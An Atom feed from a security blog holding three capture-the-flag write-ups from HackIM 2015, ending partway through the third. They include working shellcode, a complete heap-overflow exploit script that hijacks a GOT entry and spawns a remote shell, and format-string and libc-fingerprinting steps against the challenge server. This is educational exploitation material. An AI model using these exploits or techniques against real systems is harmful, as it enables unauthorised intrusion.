<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Nullcon | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/nullcon/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-03-18T20:59:19+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - Sbox]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/"/>
    <updated>2015-01-11T22:52:27+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox</id>
    <content type="html"><![CDATA[<p>Quirky little challenge, this <code>sbox</code>. We&rsquo;re actually given the keys to the kingdom right away!</p>

<!-- more -->


<p>Again, this was a one-two with superkojiman, who did the initial reversing! The program needs <code>libseccomp</code> to run. I had to install <code>libseccomp1</code> on my Ubuntu VM and symlink <code>libseccomp.so.2</code> to it to make the binary start. <a href="http://sourceforge.net/projects/libseccomp/">libseccomp</a> does syscall filtering. In this case, whatever is added to its internal list is ok, other syscalls are caught and the program exits with SIGSYS.</p>

<p>The syscalls that are whitelisted can be found by looking for <code>seccomp_rule_add</code> calls:</p>

<pre><code> 80488dc: c7 44 24 0c 00 00 00  mov    DWORD PTR [esp+0xc],0x0
 80488e3:   00 
 80488e4:   c7 44 24 08 03 00 00    mov    DWORD PTR [esp+0x8],0x3  ; syscall read
 80488eb:   00 
 80488ec:   c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
 80488f3:   7f 
 80488f4:   8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
 80488f8:   89 04 24                mov    DWORD PTR [esp],eax
 80488fb:   e8 b0 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
 8048900:   89 44 24 38             mov    DWORD PTR [esp+0x38],eax
 8048904:   83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
 8048909:   79 05                   jns    8048910 &lt;main+0x191&gt;
 804890b:   e9 d9 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
 8048910:   c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
 8048917:   00 
 8048918:   c7 44 24 08 04 00 00    mov    DWORD PTR [esp+0x8],0x4  ; syscall write
 804891f:   00 
 8048920:   c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
 8048927:   7f 
 8048928:   8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
 804892c:   89 04 24                mov    DWORD PTR [esp],eax
 804892f:   e8 7c fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
 8048934:   89 44 24 38             mov    DWORD PTR [esp+0x38],eax
 8048938:   83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
 804893d:   79 05                   jns    8048944 &lt;main+0x1c5&gt;
 804893f:   e9 a5 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
 8048944:   c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
 804894b:   00 
 804894c:   c7 44 24 08 01 00 00    mov    DWORD PTR [esp+0x8],0x1  ; syscall exit
 8048953:   00 
 8048954:   c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
 804895b:   7f 
 804895c:   8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
 8048960:   89 04 24                mov    DWORD PTR [esp],eax
 8048963:   e8 48 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
</code></pre>

<p>So that&rsquo;s not a whole lot to work with. We can only read, write and exit. No <code>execve</code> or open/read/write for us!</p>

<h2>Diving deeper</h2>

<p>Luckily, when run, the binary does all the heavy lifting for us. It reads the flag and stores it on the heap. It then waits for input, storing that also on the heap and then proceeds to run whatever is entered:</p>

<pre><code>   0x80489d6 &lt;main+599&gt;:    call   0x80485a0 &lt;read@plt&gt;
   0x80489db &lt;main+604&gt;:    mov    eax,DWORD PTR [esp+0x2c]
   0x80489df &lt;main+608&gt;:    mov    DWORD PTR [esp+0x3c],eax
   0x80489e3 &lt;main+612&gt;:    mov    eax,DWORD PTR [esp+0x3c]
   0x80489e7 &lt;main+616&gt;:    call   eax
</code></pre>

<p>This allows us to supply our own shellcode without even having to exploit a vulnerability. There were some annoying things that prevented me from debugging the binary locally, so I hex-edited the binary to make the calls to <code>signal()</code> and <code>alarm()</code> do nothing (edit the <code>plt</code> section for those calls &amp; make the first byte <code>0xc3</code> -> <code>RET</code>).</p>

<p>I started binary via <code>socat</code> to test locally. First, let&rsquo;s see what we have to work with, by sending a single <code>0xcc</code> (<code>INT 3</code>) via a python script:</p>

<pre><code class="python">import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 5555))

raw_input()
s.send("\xcc")

print s.recv(256)
s.close()
</code></pre>

<p>The <code>raw_input()</code> serves to halt the binary, given us the chance to attach gdb with</p>

<pre><code class="bash">$ gdb -pid `pgrep sbox`
</code></pre>

<p>After attaching, I entered &lsquo;c&rsquo; to continue execution. Then the binary crashes upon hitting the <code>INT 3</code>. The registers look like this, flag is in the same mmapped region:</p>

<pre><code>0xb77c6002 in ?? ()
gdb-peda$ i r
eax            0xb77c6000    0xb77c6000
ecx            0xb77c6000    0xb77c6000
edx            0x2000    0x2000
ebx            0xb77a5ff4    0xb77a5ff4
esp            0xbf9eff0c    0xbf9eff0c
ebp            0xbf9eff58    0xbf9eff58
esi            0x0    0x0
edi            0x0    0x0
eip            0xb77c6002    0xb77c6002
eflags         0x207    [ CF PF IF ]
cs             0x73    0x73
ss             0x7b    0x7b
ds             0x7b    0x7b
es             0x7b    0x7b
fs             0x0    0x0
gs             0x33    0x33
gdb-peda$ find "FLAG"
Searching for 'FLAG' in: None ranges
Found 2 results, display max 2 items:
    mapped : 0xb77c8000 ("FLAG\n")
</code></pre>

<p>I whipped up some &lsquo;shellcode&rsquo; (if you can call it that). We can use the values of the registers in our shellcode to write the flag to STDOUT. For instance, <code>ecx</code> already points to the shellcode. We just have to add <code>0x2000</code> to it to get the address of the flag!</p>

<pre><code>bits 32

push 0x20     # 
pop ebx       # pop 0x20 in ebx
shl ebx, 8    # ebx is now 0x2000
              # adjust ecx so that it points to flag in memory
add ecx, ebx  # ecx = buffer
xor ebx, ebx  # ebx = fd
inc ebx       # STDOUT; STDERR also works
xor edx, edx  # edx = count
mov dl, 0xff  # write out 255 bytes
push 4        # eax = syscall
pop eax       # eax = write
int 0x80      # get flag!
</code></pre>

<p>I avoided null-bytes, just in case. The shellcode was compiled with</p>

<pre><code class="bash">$ nasm -f bin ./shellcode.asm
</code></pre>

<p>I had issues with <code>radare2</code> not recognizing some opcodes (need to look into that!), which is why I switched to <code>nasm</code>. Using a modified version of the earlier python code, I sent the shellcode over to the server:</p>

<pre><code class="python">import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69',9001))

with open('shellcode') as f:
    data = f.read()
    s.send(data)

print s.recv(256)
s.close()
</code></pre>

<p>The result:</p>

<pre><code class="bash">$ python sploit.py
d3sp3r4t3_sh3llc0d3
</code></pre>

<p>The flag was <code>d3sp3r4t3_sh3llc0d3</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - MentalNote]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote/"/>
    <updated>2015-01-11T21:40:18+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote</id>
    <content type="html"><![CDATA[<p><code>mentalnote</code> was a 400 point exploitation-type challenge in NullCon&rsquo;s HackIM CTF.</p>

<!-- more -->


<p></p>

<p>Again, superkojiman started with the invaluable initial reverse engineering. The application is a note-taking program:</p>

<pre><code>~/tmp/nullcon/exp400$ ./MentalNote 
You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
</code></pre>

<p>superkojiman pointed out that there were two types of notes. Upon adding a note, the program asks for the type. It looks like the second type is larger. By editing a note as type two, we are able to overflow notes into the next note&rsquo;s meta-data.</p>

<p>First, let&rsquo;s allocate two notes and set them to something to inspect the heap layout.</p>

<pre><code>You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
0
Give the type to edit:
2
Give your Note:
AAAA
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
1
Give the type to edit:
2
Give your Note:
BBBB
Please enter one of the following option:
</code></pre>

<p>I located the second note in the heap using gdb-peda&rsquo;s <code>find</code> command.</p>

<pre><code>gdb-peda$ x/60w 0x804d0c0
0x804d0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0f0:  0x000000e1  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>You can see that there are several pointers stored on the heap. It looks like a doubly-linked list, with pointers to the next and previous notes. The struct that describes this layout would look something like this:</p>

<pre><code class="c">struct note {
    note *next_note;
    note *prev_note;
    char note_content[MAX_LENGTH];
};
</code></pre>

<p>I sent a stupidly large input to overflow these notes:</p>

<pre><code>gdb-peda$ r
You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
0
Give the type to edit:
2
Give your Note:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBB
</code></pre>

<p>The heap for note two now looks like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x46464646  0x47474747  0x48484848  0x49494949
0x804d0d0:  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c  0x4d4d4d4d
0x804d0e0:  0x4e4e4e4e  0x4f4f4f4f  0x50505050  0x51515151
0x804d0f0:  0x52525252  0x41414141  0x42424242  0x4242420a
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
</code></pre>

<p>We have overwritten the pointers. Furthermore, superkojiman noticed:</p>

<pre><code>gdb-peda$ vmmap
Start      End        Perm  Name
&lt;snip&gt;
0x0804c000 0x0804e000 rwxp  [heap]
</code></pre>

<p>The heap is writeable <strong>and</strong> executable. This allows us to store shellcode on the heap. Now to find a way to get the heap address reliably (ASLR is enabled) and overwrite a GOT pointer with the location of our shellcode.</p>

<p>I recently tested c0ne&rsquo;s binaries for his Pandora&rsquo;s Box VM. I did one of the challenges in a similar way: overflow a buffer up to a certain pointer to grab extra bytes when that buffer is printed. I could leak the heap address by sending just enough bytes into note one to make the heap look like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0d0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0e0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0f0:  0x4242420a  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>When I know requested the value of note one, the binary would dump out lots of B&rsquo;s, but also append the pointers from the heap! With that sorted, I could find my shellcode on the heap even with ASLR enabled. Next was overwriting a GOT pointer. This was done by overflowing a note and overwriting the pointers to <code>next_note</code> and <code>prev_note</code>. Then I&rsquo;d ask the binary to delete a note. It does this by calling <code>free()</code>. Because we can control the two pointers, we have a write-what-where primitive. By setting the right values, I could write the address of the shellcode on the heap to <code>__isoc99_scanf@got.plt</code>. Initially, I swapped the two memory addresses around, leading to mangled shellcode. After overwriting the GOT pointer of <code>__isoc99_scanf@got.plt</code>, which is one of the next functions the binary calls in its main loop, the shellcode on the heap is executed. Because of the way <code>free()</code> works, we need to adjust the addresses a bit.</p>

<p>The <a href="http://www.shell-storm.org/shellcode/files/shellcode-547.php">shellcode</a> was modified a bit (&lsquo;/bin/ash&rsquo; -> &lsquo;/bin//sh&rsquo;) and stored on the heap. The overflow was used to overwrite the two pointers, and the write-what-where is triggered by sending a &lsquo;delete note&rsquo; command.</p>

<p>The exploit:</p>

<pre><code class="python">import struct
import socket
import time
import re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69', 9004))

s.recv(1000)
time.sleep(0.5)

def p(x):
    return struct.pack('&lt;L', x)

payload  = "1\n1\n1\n1\n"   # create two notes of type one
payload += "3\n0\n2\n"      # edit note 0 as type two

s.send(payload)
time.sleep(0.5)

# overflow note to line up to heap pointer
s.send("A"*212+"BBB\n")

time.sleep(0.5)
s.recv(256)

# leak heap addr
print "[+] Trying to leaking heap address..."
time.sleep(0.5)

s.send("4\n0\n")
time.sleep(0.5)

data = s.recv(1000)

# ugly.. but works :/
m = re.search(r'.*BBB\n(....).*', data)
if m:
    heap = struct.unpack('&lt;L', m.group(1))[0]
    print "[+] Leaked heap address at {}".format(hex(heap))
    # offset for shellcode found empirically via gdb
    shellcode = heap - 0xd0
    print "[+] Shellcode at {}".format(hex(shellcode))
else:
    print "[!] Fatal: could not leak heap address"
    exit(0)

time.sleep(0.5)
print "[+] Sending new notes to overwrite got pointer..."
s.send("1\n1\n1\n1\n")  # create two more notes
time.sleep(0.5)
s.recv(1000)

# send new note to overflow pointers
s.send("3\n2\n2\n")
time.sleep(0.5)
s.recv(1000)

time.sleep(0.5)
payload = ""
sc = "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
# prepend shellcode with a little NOP sled
payload += "\x90"*(212-len(sc))
payload += sc
# overwrite note_info struct
payload += p(0x804b024-8)     # __isoc99_scanf@got.plt-8
payload += p(shellcode)       # heap location of shellcode

payload += "\n"
s.send(payload)

# request deletion of a note, triggering our write-what-where
# we overwrite a function pointer in the got with the location
# of our shellcode
time.sleep(0.5)
s.send("2\n3\n")

time.sleep(0.5)
s.recv(512)

# shell incoming!
print "[+] Enjoy your shell!"

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
</code></pre>

<pre><code>bas@tritonal:~/tmp/nullcon/exp400$ python sploit.py 
[+] Trying to leaking heap address...
[+] Leaked heap address at 0x85cf1d0
[+] Shellcode at 0x85cf100
[+] Sending new notes to overwrite got pointer...
[+] Enjoy your shell!
id
/bin//sh: 1: id: not found
cat flag.txt
flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}
</code></pre>

<p>The flag was <code>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - Mixme]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/"/>
    <updated>2015-01-11T18:52:35+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup</id>
    <content type="html"><![CDATA[<p><code>mixme</code> was a 400 points exploitation challenge of the NullCon HackIM ctf. We solved it with just 20 minutes on the clock!</p>

<!-- more -->


<p>When started, <code>mixme</code> present the following:</p>

<pre><code>==========================================
======== Uncle Podger's Data Store =======
==========================================

Select op (store/get/edit/exit): store
Name: a
Size: 4
Enter data: AAAA
Select op (store/get/edit/exit): get
Name: a
Size: 4
AAAASelect op (store/get/edit/exit): get
Name: a
Size: 4
Not found
Select op (store/get/edit/exit): Invalid input
Select op (store/get/edit/exit): 
</code></pre>

<p>Again, some kind of note storage. The binary was first reverse-engineered by superkojiman, who immediately noticed something odd: upon <code>get</code>ing a note, the program erases the note by <code>free()</code>ing the memory and NULLing the first few bytes. The rest of the bytes were left intact. This led us to think about possible use-after-free scenarios. Turns out it was something different&hellip;</p>

<p>I started tinkering with the binary. I could store notes and get them back, but only if I supplied the right size. However, I noticed that I could <em>edit</em> a note with a larger value than was allocated. The heap looks like this after allocating three notes <code>a</code>, <code>b</code> and <code>c</code> with length 4 and contents <code>AAAA</code>, <code>BBBB</code>, and <code>CCCC</code>, respectively:</p>

<pre><code># allocated three notes, in heap:
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x08314030  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
0x8314050:  0x00000000  0x00000011  0x41414141  0x00000000
0x8314060:  0x00000000  0x00000029  0x00000062  0x00000000
0x8314070:  0x00000000  0x00000000  0x00000004  0x08314090
0x8314080:  0x083140a0  0x08314030  0x00000000  0x00000011
0x8314090:  0x42424242  0x00000000  0x00000000  0x00000029
0x83140a0:  0x00000063  0x00000000  0x00000000  0x00000000
0x83140b0:  0x00000004  0x083140c8  0x08314008  0x08314068
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>At <code>0x8314030</code>, we see the first note&rsquo;s name, <code>a</code>. The zeroeth note is called <code>HEAD</code> and precedes our first note. Each note is contained within a struct, which contains pointers to the previous and next note (a doubly linked list). The meta-data for note <code>a</code> contains this pointer: <code>0x08314058</code>, which points to the data associated with that note: <code>AAAA</code>. The meta-data for the note looks something like this:</p>

<pre><code class="c">note_info struct {
    char name[16];
    int length;
    char *content;
    note_info *next_note;
    note_info *prev_note;
};
</code></pre>

<p>This also is true for the next note, <code>b</code>, which is immediately after <code>a</code> in memory. We can overwrite the meta-data of note <code>b</code> by editing note <code>a</code>.</p>

<h2>Overflowing the heap</h2>

<p>If we supply 40 bytes when editing <code>a</code> and supplying forty times <code>0x41</code>, we overwrite several parts of the meta-data of note <code>b</code>:</p>

<pre><code># after editing 'a' with 40 bytes where 4 is allocated:
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
0x8314050:  0x00000000  0x00000011  0x41414141  0x41414141
0x8314060:  0x41414141  0x41414141  0x41414141  0x41414141
0x8314070:  0x41414141  0x41414141  0x41414141  0x41414141
0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>If we now try to <code>get</code> note <code>b</code>, the binary will segfault because the pointer to the note&rsquo;s data is set to <code>0x41414141</code>. We can use this to make note <code>b</code> point to <code>free@got</code> with a bit of python. The binary is started using socat to make it listen on a port.</p>

<pre><code># set 'a' with large buffer, overwriting meta-data of 'b':
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
0x8314050:  0x00000000  0x00000011  0x41414141  0x41414141
0x8314060:  0x41414141  0x00000029  0x00000062  0x41414141
0x8314070:  0x41414141  0x41414141  0x00000024  0x08314090
0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>Notice that I&rsquo;ve kept the bytes at <code>0x8314064</code> and <code>0x8314068</code> the same: <code>0x00000029 0x00000062</code>. If these are overwritten, then the binary cannot find note <code>b</code> anymore, which effectively stops our attack! I overwrote the pointer to the data with <code>0x804b020</code>. This is the pointer to <code>free()</code> in the Global Offset Table. Remember, after every <code>get</code> sent to the binary, <code>free()</code> is called. By overwriting the pointer to the note data, we can set any memory to arbitrary values with an <code>edit b</code> command to the binary!</p>

<h2>Control of execution</h2>

<p>I tested this hypothesis with the following python:</p>

<pre><code class="python">import re
import string
import struct
import socket
import time
import telnetlib
import sys

def p(x):
    return struct.pack('&lt;L', x)

# function to send commands to the binary
def z(sock, x):
    sock.send(x + '\n')
    time.sleep(0.01)
    data = sock.recv(200)
    time.sleep(0.01)
    return data

# connect to remote host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 9005))

# receive banner
s.recv(512)

# ask the binary to store three notes
# we'll overflow a into b later on
z(s, "store")
z(s, "a")
z(s, "4")
z(s, "AAAA")

z(s, "store")
z(s, "b")
z(s, "4")
z(s, "BBBB")

z(s, "store")
z(s, "c")
z(s, "4")
z(s, "CCCC")

# edit a with a large value
# this overflows and overwrites the note_info struct of b
# the pointer to the data is overwriting with free@got
print "[+] overflowing a to set b to free@got"
z(s, 'edit')
z(s, 'a')
z(s, '40')
z(s, "A"*12+"\x29\x00\x00\x00\x62\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
#     ^ overflow    ^ restore 0x29, 'b'               ^ size of b ^ free@got

# overwrite free@got with printf
print "[+] replacing free() with printf()"
z(s, 'edit')
z(s, 'b')
z(s, '4')
z(s, 'BBBB')

z(s, 'get')
z(s, 'c')
z(s, '4')
</code></pre>

<p>This made the binary crash. The coredump reported the following:</p>

<pre><code class="python">#0  0x42424242 in ?? ()
gdb-peda$ i r
eax            0x843b0c8    0x843b0c8
ecx            0x843b0c8    0x843b0c8
edx            0x4  0x4
ebx            0xb779cff4   0xb779cff4
esp            0xbf95245c   0xbf95245c
ebp            0xbf952498   0xbf952498
esi            0x0  0x0
edi            0x0  0x0
eip            0x42424242   0x42424242
eflags         0x10207  [ CF PF IF RF ]
cs             0x73 0x73
ss             0x7b 0x7b
ds             0x7b 0x7b
es             0x7b 0x7b
fs             0x0  0x0
gs             0x33 0x33
gdb-peda$ p system
$1 = {&lt;text variable, no debug info&gt;} 0xb7636060 &lt;system&gt;
gdb-peda$ x/4x $esp
0xbf95245c: 0x08048bb8  0x0843b0c8  0x0843b0c8  0x00000004

gdb-peda$ x/4x $eax
0x843b0c8:  0x43434343  0x00000000
</code></pre>

<p>Bloody awesome! We not only have control over EIP, but also eax, ecx and the first argument on the stack point to memory that we control. This will come in handy later.</p>

<h2>Turning the heap overflow into a format string vulnerability</h2>

<p>With what should I overwrote the got pointer to <code>free()</code> though? I looked for ROP gadgets, but there weren&rsquo;t enough to pivot the stack into the heap and spawn a shell, or open/read/write the flag to stdout. Furthermore, I assumed ASLR was enabled so I had to leak libc addresses first.</p>

<p>After thinking about it, I chose to overwrite <code>free@got</code> with <code>printf@plt</code>. This turns the heap overflow into a format string vulnerability! Maybe this is where the challenge name comes from&hellip;</p>

<p>After setting <code>free@got</code> to <code>printf@plt</code>, whenever I ask the binary to <code>get</code> a note, I can print whatever content is associated with that note (because <code>free()</code> is called with the pointer to the content of the note).</p>

<p>I examined the stack by supplying a format string consisting of a bunch of <code>%x</code>&rsquo;s. Obviously, I couldn&rsquo;t dig up my own format string from the stack, because the format string itself is on the heap!</p>

<h2>What&rsquo;s that gem?</h2>

<p>Examining the stack, I dumped the following data:</p>

<pre><code># local binary
85850c8-122-b75c77b0-122-85850a0-85850a0-63... &lt;snip&gt;
</code></pre>

<p>That third address looks promising! It points into <code>libc</code>. Unfortunately, there&rsquo;s a problem. Running the script against the server gave a different address:</p>

<pre><code># remote binary
83370c8-122-b75c0024-122-83370a0-83370a0-b7000063-... &lt;snip&gt;
936e0c8-122-b764a024-122-936e0a0-936e0a0-b7000063-... &lt;snip&gt;
</code></pre>

<p>We notice two things: ALSR is on and the remote binary seems to have a different libc than my local box (which was an Ubuntu 12.04 VM). I turned the format string into <code>%3$s</code> to find out which bytes were on the local and remote libc address. For the local binary, it returned <code>0x168bc085</code>. For the remote binary, however, it returned <code>0x7501c083</code>. These differences pointed towards different versions of libc. This was a nightmare! How am I supposed to find anything useful in libc without access to the specific library?</p>

<h2>Finding the correct libc</h2>

<p>I decided to try and identify the libc version. With less than 60 minutes to go, I went for it. If I had the right version of libc, I had everything to leak a libc address, add an offset to get <code>system()</code> and spawn a shell. I tried to nmap the remote server, which seemed too slow. However, <code>ssh</code> was enabled:</p>

<pre><code class="bash">bas@tritonal:~/tmp/nullcon/mixme$ ssh test@54.163.248.69 -vvv
OpenSSH_6.0p1 Debian-4+deb7u2, OpenSSL 1.0.1e 11 Feb 2013
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: Applying options for *
debug2: ssh_connect: needpriv 0
debug1: Connecting to 54.163.248.69 [54.163.248.69] port 22.
debug1: Connection established.
debug1: identity file /home/bas/.ssh/id_rsa type -1
debug1: identity file /home/bas/.ssh/id_rsa-cert type -1
debug1: identity file /home/bas/.ssh/id_dsa type -1
debug1: identity file /home/bas/.ssh/id_dsa-cert type -1
debug1: identity file /home/bas/.ssh/id_ecdsa type -1
debug1: identity file /home/bas/.ssh/id_ecdsa-cert type -1
debug1: Remote protocol version 2.0, remote software version OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
&lt;snip&gt;
</code></pre>

<p>Googling <code>OpenSSH_6.6.1p1 Ubuntu-2ubuntu2</code> led me to believe that Ubuntu 14.04 was being run. I downloaded all the i386 libc version I could find, unpacked them and searched them for the bytes I just leaked:</p>

<pre><code class="bash">bas@tritonal:~/tmp/nullcon/mixme/libc$ for i in `ls`; do echo $i; echo; xxd $i | egrep '83.?c0.?01.?75'; echo; done


libc-2.15-0ubuntu10.9.so

0043740: 8934 24e8 f8f4 0200 83c0 0175 b0c7 8570  .4$........u...p
00460a0: 0000 0089 3424 e895 cb02 0083 c001 75bb  ....4$........u.
0046720: 0200 83c0 0175 80c7 8570 fbff ffff ffff  .....u...p......
0046810: 2cc4 0200 83c0 0175 a5c7 8570 fbff ffff  ,......u...p....
0046890: e8ab c302 0083 c001 75ac c785 70fb ffff  ........u...p...
0047320: 4424 04e8 18b9 0200 83c0 0175 80c7 8570  D$.........u...p
0047410: 0000 0089 3424 e825 b802 0083 c001 75a4  ....4$.%......u.
005a180: 83c0 0175 a4c7 85b0 efff ffff ffff ffe9  ...u............
005b410: 3424 e8f9 1001 0083 c001 75ae c785 b0ef  4$........u.....
005c370: 0089 3424 e897 0101 0083 c001 7580 c785  ..4$........u...
00674c0: 0a00 0000 8904 24e8 74b7 0000 83c0 0175  ......$.t......u

libc-2.16-0ubuntu6.so

0047b50: 83c0 0175 a8e9 97bf ffff 81e1 ff00 0000  ...u............
005ad90: 0083 c001 75b9 e95b ccff ff8b 4d10 8b45  ....u..[....M..E
0066ab0: 7cb4 0000 83c0 0175 918d b426 0000 0000  |......u...&amp;....

libc-2.19-0ubuntu6.4.so

00471c0: 0489 3424 e817 9e02 0083 c001 758a e9d1  ..4$........u...
0047920: 24e8 ba96 0200 83c0 0175 c5e9 74c2 ffff  $........u..t...
005a850: 8904 24e8 d801 0100 83c0 0175 b8e9 04cc  ..$........u....
005b3a0: 83c0 0175 c9e9 bcc0 ffff a810 8d74 2600  ...u.........t&amp;.
0066020: bcaf 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....

